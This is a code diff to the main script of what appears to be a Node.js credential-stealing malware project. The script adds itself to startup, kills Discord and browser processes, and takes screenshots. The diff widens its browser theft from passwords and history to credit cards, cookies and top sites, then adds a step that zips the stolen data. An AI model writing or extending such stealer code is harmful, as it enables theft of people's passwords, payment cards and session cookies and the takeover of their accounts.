@@ -8,9 +8,8 @@ module.exports.tempFolder = tempFolder;
 
 config.addToStartup && require('./util/functions/startup');
 config.killDiscord  && require('./util/functions/kill-discord');
-// require('./util/functions/webhook');
 // require('./util/functions/grab')(tempFolder);
-require('./util/functions/screenshot')(tempFolder);
+require('./util/functions/screenshot');
 // require('./util/functions/fake-error');
 
 const browsers = [
@@ -30,7 +29,11 @@ browsers.forEach((browser) => {
   if (existsSync(path)) {
     // Kill browser process
     grab.kill(browser[0], () => {
-      ['passwords', 'history'].forEach(fn => grab[fn](browser[1].join(' '), path));
+      ['passwords', 'history', 'creditCards', 'cookies', 'topSites']
+        .forEach(fn => grab[fn](browser[1].join(' '), path));
     });
   }
 });
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+sleep(1000).then(() => require('./util/functions/zip'));
